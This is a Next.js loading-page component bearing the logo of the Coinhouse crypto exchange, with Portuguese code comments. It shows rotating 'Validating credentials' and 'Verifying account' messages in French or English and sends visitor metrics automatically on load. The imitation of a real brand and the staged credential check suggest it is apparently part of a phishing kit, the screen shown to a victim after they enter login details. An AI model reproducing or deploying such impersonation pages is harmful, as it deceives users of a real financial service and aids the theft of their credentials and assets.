"use client"

import { useState, useEffect } from "react"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ChevronDown } from "lucide-react"
import Image from "next/image"
import { useMetrics } from "@/hooks/useMetrics"

// Detectar idioma do navegador - padrão sempre inglês exceto francês
const getDefaultLanguage = () => {
  if (typeof window !== "undefined") {
    const browserLang = navigator.language.toLowerCase()
    return browserLang.startsWith("fr") ? "fr" : "en"
  }
  return "en"
}

const translations = {
  fr: {
    loadingMessages: [
      "Validation des identifiants...",
      "Vérification du compte...",
      "Analyse de votre compte...",
      "Chargement de votre profil...",
      "Sécurisation de la connexion...",
      "Finalisation...",
      "Veuillez patienter..."
    ],
    preparing: "Préparation de votre expérience d'investissement..."
  },
  en: {
    loadingMessages: [
      "Validating credentials...",
      "Verifying account...",
      "Analyzing your account...",
      "Loading your profile...",
      "Securing connection...",
      "Finalizing...",
      "Please wait..."
    ],
    preparing: "Preparing your investment experience..."
  },
}

export default function LoadingPage() {
  const metrics = useMetrics() // Hook das métricas
  const [language, setLanguage] = useState(() => getDefaultLanguage())
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0)

  const t = translations[language as keyof typeof translations]

  // Envio automático de métricas ao carregar a página
  useEffect(() => {
    if (!metrics.isRegistered) {
      metrics.registerVisit() // Envia métricas automaticamente
    }
  }, [metrics])

  // Alterar mensagem a cada 2 segundos
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentMessageIndex((prevIndex: number) => 
        (prevIndex + 1) % t.loadingMessages.length
      )
    }, 2000)

    return () => clearInterval(interval)
  }, [t.loadingMessages.length])

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header com seletor de idioma */}
      <div className="flex justify-end p-6 md:p-8">
        <Select value={language} onValueChange={setLanguage}>
          <SelectTrigger className="w-16 border border-gray-300 rounded-full px-3 py-1 h-auto font-medium [&>svg]:hidden bg-white shadow-sm">
            <SelectValue />
            <ChevronDown className="h-3 w-3 ml-1 text-gray-600" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="fr">FR</SelectItem>
            <SelectItem value="en">GB</SelectItem>
          </SelectContent>
        </Select>
      </div>

      {/* Conteúdo principal centralizado */}
      <div className="flex-1 flex flex-col items-center justify-center px-6">
        {/* Logo Coinhouse */}
        <div className="mb-16">
          <Image 
            src="/coinhouse-logo.png" 
            alt="Coinhouse" 
            width={250} 
            height={50} 
            className="h-10 md:h-12 w-auto" 
            priority
          />
        </div>
        
        {/* Loading Spinner - Simples e preto */}
        <div className="mb-10">
          <div className="w-14 h-14 md:w-16 md:h-16 border-4 border-gray-200 rounded-full animate-spin border-t-black"></div>
        </div>

        {/* Mensagem de loading com transição suave */}
        <div className="text-center min-h-[60px] flex items-center">
          <p className="text-lg md:text-xl text-gray-700 font-medium transition-all duration-500 ease-in-out transform">
            {t.loadingMessages[currentMessageIndex]}
          </p>
        </div>
      </div>

      {/* Footer com texto motivacional */}
      <div className="text-center pb-8 px-6">
        <p className="text-sm text-gray-500">
          {t.preparing}
        </p>
      </div>
    </div>
  )
} 